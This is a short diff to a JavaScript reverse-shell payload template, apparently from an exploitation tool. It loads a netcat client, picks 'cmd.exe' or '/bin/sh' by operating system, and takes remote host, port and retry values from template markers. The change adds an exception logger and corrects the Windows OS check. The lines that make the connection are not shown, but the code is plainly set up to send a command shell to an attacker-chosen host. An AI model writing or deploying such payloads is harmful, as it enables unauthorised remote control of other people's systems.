@@ -1,10 +1,16 @@
+const fs = require('fs')
 var NetcatClient = require('netcat').client
 const $ = require('cash')
+
+process.on('uncaughtException', function(err) {
+  fs.writeFileSync('log.txt', JSON.stringify(err.message))
+  process.exit(1)
+})
 
 var nc = new NetcatClient()
 
 // Marker replaced at runtime.
-var CMD = '{{os}}' === 'win' ? 'cmd.exe' : '/bin/sh'
+var CMD = '{{os}}' === 'win32' ? 'cmd.exe' : '/bin/sh'
 var RHOST = '{{rhost}}'
 var RPORT = {{rport}}
 var RETRY = {{retry}}
